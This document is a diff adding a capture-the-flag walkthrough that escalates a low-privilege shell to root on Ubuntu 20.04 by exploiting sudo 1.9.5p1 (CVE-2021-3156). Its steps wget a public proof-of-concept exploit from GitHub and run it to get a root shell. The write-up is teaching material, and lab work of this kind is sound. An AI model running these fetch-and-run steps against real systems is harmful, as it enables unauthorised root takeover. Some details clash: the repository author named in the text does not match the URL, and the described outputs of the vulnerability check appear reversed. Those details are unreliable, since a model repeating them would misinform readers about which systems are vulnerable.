@@ -1,0 +1,130 @@
+Lost Privileges - Solution Walkthrough
+=======================================
+
+This challenge gives you a shell as a low-privilege user on a Linux server.
+There is nothing you can do with it... or so they say. This walkthrough covers
+how to find the vulnerability, understand why it works, and exploit it to
+become root and read the flag.
+
+You do not need to write exploit code from scratch. Every step here uses freely
+available tools.
+
+
+step 1: connect and see what you are working with
+--------------------------------------------------
+Connect to the challenge:
+
+    nc <host> 9001
+
+You will land at a bash prompt as the user "player". Explore the environment:
+
+    whoami          # prints:  player
+    id              # uid=1001(player) gid=1001(player) groups=1001(player)
+    cat /etc/os-release | head -3   # Ubuntu 20.04
+
+The flag is at /root/flag.txt — readable only by root:
+
+    cat /root/flag.txt      # Permission denied
+    ls -la /root/flag.txt   # -rw------- 1 root root ...
+
+There is a clear goal: become root.
+
+
+step 2: enumerate what tools are on the system
+-----------------------------------------------
+Check whether there is anything to escalate with:
+
+    sudo -l
+
+You will see something like:
+
+    Sorry, user player may not run sudo on <hostname>.
+
+So "player" is not in sudoers at all. That's fine — check what sudo VERSION is
+installed, which is a different question from what you are allowed to do with it:
+
+    sudo --version
+
+Output will start with:
+
+    Sudo version 1.9.5p1
+
+Note that version number carefully.
+
+
+step 3: recognise the vulnerability
+-------------------------------------
+Search "sudo 1.9.5p1 vulnerability" — you will quickly find:
+
+    CVE-2021-3156, nicknamed "Baron Samedit"
+
+This is a heap buffer overflow in sudo versions up to and including 1.9.5p1,
+patched in 1.9.5p2. The critical detail: it can be triggered by ANY local user,
+regardless of whether they have ANY sudoers entry. The fact that your account is
+not in sudoers is irrelevant to this bug.
+
+What the bug is, in plain terms:
+  When sudo processes command-line arguments it uses a function that parses
+  backslash-escaped characters. A flaw in how memory was allocated for those
+  arguments causes a heap buffer overflow that lets an attacker overwrite
+  internal data structures and ultimately redirect execution. A working exploit
+  uses this to overwrite in-memory policy structures so that sudo's privilege
+  escalation code runs for a non-sudoers user and spawns a root shell.
+
+You can confirm the system is vulnerable without crashing anything:
+
+    sudoedit -s '\' $(python3 -c 'print("A"*65)')
+
+A vulnerable system prints a usage error (not a "permission denied"). A patched
+system prints "sudoedit: invalid option -- 's'" and exits immediately.
+
+
+step 4: get a public exploit
+------------------------------
+The container has `python3`, `wget`, and `git`, so you can pull a public
+proof-of-concept from inside the box. The exploit at secnigma's GitHub repo
+is well-known, well-documented, and works reliably against Ubuntu 20.04:
+
+    wget https://raw.githubusercontent.com/stong/CVE-2021-3156/master/exploit.py \
+         -O /tmp/exploit.py
+
+If that specific URL has changed, search GitHub for "CVE-2021-3156" or
+"Baron Samedit exploit" and look for a Python or C implementation. There are
+several widely-used ones; any working Python or C PoC targeting Ubuntu 20.04
+with sudo 1.9.5p1 will do.
+
+
+step 5: run the exploit
+-------------------------
+    python3 /tmp/exploit.py
+
+If the exploit works, your terminal prompt changes to:
+
+    # (root shell)
+
+Verify:
+
+    whoami      # root
+    id          # uid=0(root) gid=0(root) groups=0(root)
+
+
+step 6: read the flag
+-----------------------
+    cat /root/flag.txt
+
+You will see the flag in the format CSEC{...}. Copy and submit it.
+
+
+what just happened — the short version
+----------------------------------------
+`sudo` up to version 1.9.5p1 had a bug in how it allocated heap memory during
+argument parsing. By crafting a specific sequence of characters (a backslash
+followed by many bytes of data) an unprivileged user could overflow a heap
+buffer, overwrite internal sudo data, and trick sudo into executing a root shell.
+The bug was present in every Linux distribution shipping that sudo version, and
+it was exploitable by any local user account, whether listed in sudoers or not.
+The fix (in 1.9.5p2) corrected the heap allocation logic.
+
+CVE-2021-3156 was discovered by Qualys and responsibly disclosed in January 2021.
+It affected systems that had not been updated for years as well as freshly
+installed systems on distributions that shipped the old sudo package.
